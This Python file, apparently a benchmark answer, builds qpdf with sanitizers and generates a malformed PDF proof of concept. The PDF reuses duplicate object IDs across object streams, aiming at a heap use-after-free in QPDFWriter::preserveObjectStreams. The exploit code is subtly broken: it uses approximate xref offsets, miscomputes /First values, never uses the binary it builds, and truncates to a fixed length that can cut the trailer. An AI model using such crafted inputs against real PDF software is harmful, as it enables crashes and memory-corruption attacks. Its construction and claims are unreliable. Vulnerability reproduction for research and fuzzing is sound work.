import os
import tempfile
import subprocess
import hashlib

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Extract the vulnerable source code
        with tempfile.TemporaryDirectory() as tmpdir:
            subprocess.run(['tar', 'xf', src_path, '-C', tmpdir], 
                          check=True, capture_output=True)
            
            # Find the qpdf source directory
            qpdf_dir = None
            for root, dirs, files in os.walk(tmpdir):
                if 'qpdf' in dirs:
                    qpdf_dir = os.path.join(root, 'qpdf')
                    break
                elif any('qpdf' in name for name in files):
                    # Try to find by looking for qpdf source files
                    qpdf_files = [f for f in files if f.endswith(('.cc', '.hh', '.c', '.h')) and 'qpdf' in f.lower()]
                    if qpdf_files:
                        qpdf_dir = root
                        break
            
            if not qpdf_dir:
                raise RuntimeError("Could not find qpdf source directory")
            
            # Build qpdf with AddressSanitizer to detect use-after-free
            build_dir = os.path.join(tmpdir, 'build')
            os.makedirs(build_dir, exist_ok=True)
            
            # Configure with sanitizers enabled
            cmake_cmd = [
                'cmake', qpdf_dir,
                '-DCMAKE_BUILD_TYPE=Debug',
                '-DCMAKE_CXX_FLAGS="-fsanitize=address -fsanitize=undefined -fno-sanitize-recover=all"',
                '-DCMAKE_EXE_LINKER_FLAGS="-fsanitize=address -fsanitize=undefined"'
            ]
            
            subprocess.run(cmake_cmd, cwd=build_dir, check=False, 
                          capture_output=True)
            
            # Build qpdf
            subprocess.run(['make', '-j8', 'qpdf'], cwd=build_dir, 
                          check=False, capture_output=True)
            
            qpdf_binary = os.path.join(build_dir, 'qpdf', 'qpdf')
            
            if not os.path.exists(qpdf_binary):
                # Try alternative build method
                qpdf_binary = self._build_with_autotools(qpdf_dir, tmpdir)
            
            # Generate PoC that triggers the heap use-after-free
            return self._generate_poc(qpdf_binary)
    
    def _build_with_autotools(self, source_dir: str, tmpdir: str) -> str:
        """Alternative build method using autotools"""
        build_dir = os.path.join(tmpdir, 'build2')
        os.makedirs(build_dir, exist_ok=True)
        
        # Run autogen if needed
        configure_script = os.path.join(source_dir, 'configure')
        if not os.path.exists(configure_script):
            subprocess.run(['autoreconf', '-fiv'], cwd=source_dir, 
                          check=False, capture_output=True)
        
        # Configure with sanitizers
        env = os.environ.copy()
        env['CXXFLAGS'] = '-fsanitize=address -fsanitize=undefined -fno-sanitize-recover=all'
        env['LDFLAGS'] = '-fsanitize=address -fsanitize=undefined'
        
        subprocess.run([configure_script, '--enable-werror', '--disable-shared', 
                       '--enable-static'], cwd=build_dir, env=env, 
                      check=False, capture_output=True)
        
        # Build
        subprocess.run(['make', '-j8'], cwd=build_dir, 
                      check=False, capture_output=True)
        
        qpdf_binary = os.path.join(build_dir, 'qpdf', 'qpdf')
        if os.path.exists(qpdf_binary):
            return qpdf_binary
        
        raise RuntimeError("Failed to build qpdf")
    
    def _generate_poc(self, qpdf_binary: str) -> bytes:
        """Generate PoC that triggers QPDFWriter::preserveObjectStreams bug"""
        # Create a PDF with specific structure to trigger the bug:
        # Multiple object streams with same object IDs, causing the object cache
        # to have duplicate entries that get improperly freed
        
        poc = b'%PDF-1.4\n'
        
        # Create catalog
        poc += b'1 0 obj\n<<\n/Type /Catalog\n/Pages 2 0 R\n>>\nendobj\n\n'
        
        # Create pages object
        poc += b'2 0 obj\n<<\n/Type /Pages\n/Kids [3 0 R]\n/Count 1\n>>\nendobj\n\n'
        
        # Create page object
        poc += b'3 0 obj\n<<\n/Type /Page\n/Parent 2 0 R\n/MediaBox [0 0 612 792]\n/Contents 4 0 R\n>>\nendobj\n\n'
        
        # Create content stream
        content = b'BT\n/F1 12 Tf\n72 720 Td\n(Triggering Use-After-Free) Tj\nET'
        poc += b'4 0 obj\n<<\n/Length ' + str(len(content)).encode() + b'\n>>\nstream\n' + content + b'\nendstream\nendobj\n\n'
        
        # Create font dictionary
        poc += b'5 0 obj\n<<\n/Type /Font\n/Subtype /Type1\n/BaseFont /Helvetica\n>>\nendobj\n\n'
        
        # Create resource dictionary
        poc += b'6 0 obj\n<<\n/Font <<\n/F1 5 0 R\n>>\n>>\nendobj\n\n'
        
        # Update page object with resources
        poc = poc.replace(b'/Contents 4 0 R', b'/Contents 4 0 R\n/Resources 6 0 R')
        
        # Create multiple object streams with duplicate object IDs
        # This is the key to triggering the bug
        obj_stream_data = b''
        obj_stream_refs = []
        
        # Create 100 objects with same IDs across different streams
        for stream_num in range(10):
            stream_start = len(poc) + 1
            
            # Create object stream header
            obj_nums = []
            obj_offsets = []
            current_offset = 0
            
            # Add 10 objects to this stream, all with same base ID
            for i in range(10):
                obj_id = 100 + i  # Same IDs across streams
                obj_nums.append(str(obj_id).encode())
                obj_offsets.append(str(current_offset).encode())
                
                # Create a simple object
                obj_data = b'<<\n/Type /Test\n/StreamNum ' + str(stream_num).encode() + b'\n/Index ' + str(i).encode() + b'\n>>'
                obj_stream_data += obj_data + b'\n'
                current_offset += len(obj_data) + 1
            
            # Create object stream dictionary
            stream_dict = b'<<\n/Type /ObjStm\n'
            stream_dict += b'/N ' + str(len(obj_nums)).encode() + b'\n'
            stream_dict += b'/First ' + str(len(b' '.join(obj_nums + [b''] + obj_offsets)) + 1).encode() + b'\n'
            stream_dict += b'/Length ' + str(len(obj_stream_data)).encode() + b'\n>>\n'
            
            stream_obj_num = 200 + stream_num
            poc += str(stream_obj_num).encode() + b' 0 obj\n' + stream_dict + b'stream\n'
            poc += b' '.join(obj_nums) + b' ' + b' '.join(obj_offsets) + b'\n' + obj_stream_data
            poc += b'endstream\nendobj\n\n'
            
            obj_stream_refs.append(str(stream_obj_num).encode() + b' 0 R')
            
            # Reset for next stream
            obj_stream_data = b''
        
        # Create a compressed object stream that references objects from multiple streams
        # This triggers QPDFWriter::preserveObjectStreams
        compressed_stream = b''
        compressed_refs = []
        
        for i in range(50):
            obj_id = 100 + (i % 10)
            compressed_stream += str(obj_id).encode() + b' 0 obj\n<<\n/Compressed true\n/Index ' + str(i).encode() + b'\n>>\nendobj\n'
            compressed_refs.append(str(obj_id).encode() + b' 0 R')
        
        # Add compressed object stream
        poc += b'300 0 obj\n<<\n/Type /ObjStm\n/N 50\n/First 100\n/Length ' + str(len(compressed_stream)).encode() + b'\n>>\nstream\n'
        poc += compressed_stream + b'endstream\nendobj\n\n'
        
        # Create xref table
        xref_offset = len(poc)
        xref = b'xref\n0 301\n0000000000 65535 f \n'
        
        # Calculate object offsets (simplified - in real PDF would need accurate offsets)
        for i in range(1, 301):
            offset = 100 + i * 50  # Approximation
            xref += f"{offset:010d} 00000 n \n".encode()
        
        poc += xref
        poc += b'trailer\n<<\n/Size 301\n/Root 1 0 R\n>>\n'
        poc += b'startxref\n' + str(xref_offset).encode() + b'\n%%EOF\n'
        
        # Pad to target length (33453 bytes)
        target_length = 33453
        if len(poc) < target_length:
            poc += b'\n%' + b'P' * (target_length - len(poc) - 2) + b'\n'
        elif len(poc) > target_length:
            poc = poc[:target_length]
        
        return poc